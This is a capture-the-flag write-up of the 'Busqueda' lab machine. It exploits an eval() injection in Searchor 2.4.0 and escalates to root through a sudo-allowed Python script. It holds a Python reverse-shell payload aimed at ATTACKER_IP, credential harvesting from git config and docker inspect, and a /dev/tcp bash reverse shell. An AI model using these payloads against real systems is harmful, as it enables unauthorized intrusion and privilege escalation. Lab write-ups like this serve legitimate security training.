# Busqueda

### Typology:

_Linux_

I start the machine with a simple nmap scan:
```bash	
nmap -p- -sC -sV 10.10.11.208
```
output:
```bash	
22/tcp open  ssh
80/tcp open  http
```
I started taking a look at port 80 on browser, but i need to add the host at __"/etc/hosts"__ with the domain name:
```bash	
echo "10.10.11.208  searcher.htb" >> /etc/hosts
```
The site is runned by __"Flask and Searchor 2.4.0"__; by searching this version we find a vulnerability that was fixed in the next version, in the fix the developers removed 3 lines of code with an evla() statement:
```python	
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```
after a bit of searching online i found a POC at this [link](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-), in the repo there is a payload:
```	
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
we just need to replace ATTACKER_IP and PORT with ours. so we can start our listener (i use pwncat) send the payload:
```bash	
python3 -m pwncat -lp 4444
```
we are in as SVC user and we can go in our /home directory and submit the first flag as usually I uploaded __"linpeas"__ using pwncat's command:
```bash	
Ctrl + "d"
upload /home/kali/Pentest/linpeas.sh /tmp/linpeas.sh
Ctrl + "d"
cd /tmp
bash linpeas.sh
```
Linpeas output a .git folder in the /var/www/app and there is a config file:
```git	
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
[remote "origin"]
	url = http://cody:[REDACTED]@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```
the interesting part is this one:
```	
http://cody:[REDACTED]@gitea.searcher.htb/cody/Searcher_site.git
```
Indeed we can retrieve username and password of cody account on gitea but there isn't anything that it could be use;

After some minutes I ran this command:
```bash
sudo -l
```
output:
```	
Matching Defaults entries for svc on busqueda:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
by running the command as root we get 3 options:
```bash	
docker-ps     : List running docker containers
docker-inspect : Inpect a certain docker container
full-checkup  : Run a full system checkup
```
then:
```bash	
sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```
output:
```bash	
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 23 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 23 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
so I have an idea of what containers are running and I have their ID so i can inspect them with the next command:
```bash
sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
```
output:
```bash
[....]
"USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=[REDACTED]"
[....]
```
so we found a password for another user on gitea... maybe the admin, the right one it was Administrator

Now we are inside of the administrator repo where there are all the scripts that we can run as root while beeing unprivileged user

Inside the repo we can se the vulnerable line of code that we can take advantage of:
```python
elif action == 'full-checkup':
try:
    arg_list = ['./full-checkup.sh']
```
If we pass the "full-checkup" argument the script runs a full-checkup.sh from the actual directory so there is a possibility to craft our exploit:
```bash	
cd /tmp
echo "#!/bin/bash" >> full-checkup.sh
echo "/bin/bash -i >& /dev/tcp/10.10.14.156/6666 0>&1" >> full-checkup.sh
chmod +x full-checkup.sh
```
Now we have prepared our rev-shell payload and we can setup our (pwncat in my case) listener and run the script in /tmp directory:
```bash
python3 -m pwncat  -lp 6666
```
then:
```bash
sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
We're root and we can submit the root flag.
